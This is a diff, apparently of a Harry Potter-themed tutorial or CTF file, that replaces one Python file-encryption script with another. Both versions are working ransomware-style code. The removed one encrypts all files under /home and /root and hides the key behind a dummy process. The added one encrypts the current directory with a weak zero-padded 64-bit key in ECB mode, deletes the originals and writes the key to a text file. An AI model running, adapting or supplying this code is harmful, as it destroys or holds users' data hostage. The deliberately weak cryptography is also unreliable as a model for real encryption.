@@ -85,87 +85,59 @@ if __name__ == "__main__":
 ```
 import os
 import base64
-import random
-import subprocess
-import time
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-KEY_FILE = "/tmp/.hidden_key"
-RESTORE_FILE = "/tmp/.horcrux"
-HORCRUX_PROC_NAME = "key.horcrux"
+# Constants
+KEY_SIZE = 8  # 64-bit
+BLOCK_SIZE = 16
+ENC_EXT = ".voldemort"
 
+# Padding helpers
 def pad(data):
-    pad_len = AES.block_size - len(data) % AES.block_size
-    return data + bytes([pad_len]) * pad_len
+    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
+    return data + bytes([pad_len] * pad_len)
 
-def encrypt_file(filepath, key):
-    try:
-        with open(filepath, "rb") as f:
-            data = f.read()
-        cipher = AES.new(key, AES.MODE_CBC)
-        ct_bytes = cipher.encrypt(pad(data))
-        with open(filepath, "wb") as f:
-            f.write(cipher.iv + ct_bytes)
-    except Exception as e:
-        pass  # Skip unreadable or locked files
-
-def encrypt_directory(path, key):
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            filepath = os.path.join(root, file)
-            encrypt_file(filepath, key)
-
-def hide_key_in_memory(encoded_key):
-    # Write key temporarily to file
-    with open(KEY_FILE, "w") as f:
-        f.write(encoded_key)
-
-    # Spawn dummy long-living process
-    proc = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL)
-    
-    # Tag the process name (fake logic - purely symbolic, not visible in `ps`)
-    print(f"[+] Key hidden. PID: {proc.pid} named as '{HORCRUX_PROC_NAME}'")
-
-    # Remove key file after it's "loaded in RAM"
-    os.remove(KEY_FILE)
-
-    return proc.pid
-
-def monitor_horcrux_process(pid, encoded_key):
-    try:
-        while True:
-            # Check if the process is still running
-            if not os.path.exists(f"/proc/{pid}"):
-                print("[!] Horcrux process was killed. Restoring key to disk...")
-                with open(RESTORE_FILE, "w") as f:
-                    f.write(encoded_key)
-                break
-            time.sleep(3)
-    except KeyboardInterrupt:
-        pass
+def encrypt_file(file_path, cipher):
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    encrypted_data = cipher.encrypt(pad(data))
+    with open(file_path + ENC_EXT, 'wb') as f:
+        f.write(encrypted_data)
+    os.remove(file_path)
 
 def generate_key():
-    return get_random_bytes(16)  # AES-128 bit
+    raw_key = get_random_bytes(KEY_SIZE)
+    padded_key = raw_key.ljust(BLOCK_SIZE, b'\0')  # AES-128 requires 16 bytes
+    return raw_key, padded_key
+
+def encrypt_directory(root_path, cipher):
+    for foldername, subfolders, filenames in os.walk(root_path):
+        for filename in filenames:
+            file_path = os.path.join(foldername, filename)
+            # Avoid encrypting already encrypted or hidden files
+            if not file_path.endswith(ENC_EXT) and not filename.startswith('.'):
+                try:
+                    encrypt_file(file_path, cipher)
+                    print(f"[+] Encrypted: {file_path}")
+                except Exception as e:
+                    print(f"[-] Skipped (Error): {file_path} — {e}")
 
 def main():
-    key = generate_key()
-    encoded_key = base64.b64encode(key).decode()
+    print("[*] Generating AES-128 key...")
+    raw_key, aes_key = generate_key()
 
-    BASE_HOME = "/home"
-    for user_dir in os.listdir(BASE_HOME):
-        path = os.path.join(BASE_HOME, user_dir)
-        if os.path.isdir(path):
-            print(f"[+] Encrypting: {path}")
-            encrypt_directory(path, key)
+    cipher = AES.new(aes_key, AES.MODE_ECB)
 
-    ROOT_HOME = "/root"
-    if os.path.exists(ROOT_HOME):
-        print(f"[+] Encrypting root directory: {ROOT_HOME}")
-        encrypt_directory(ROOT_HOME, key)
+    print("[*] Encrypting all files under current directory...")
+    encrypt_directory(os.getcwd(), cipher)
 
-    horcrux_pid = hide_key_in_memory(encoded_key)
-    monitor_horcrux_process(horcrux_pid, encoded_key)
+    # Store base64 key for next step
+    encoded_key = base64.b64encode(raw_key).decode()
+    with open("temp_horcrux_key.txt", "w") as f:
+        f.write(encoded_key)
+    
+    print(f"[✔] Encryption complete. Base64 Key stored temporarily.")
 
 if __name__ == "__main__":
     main()
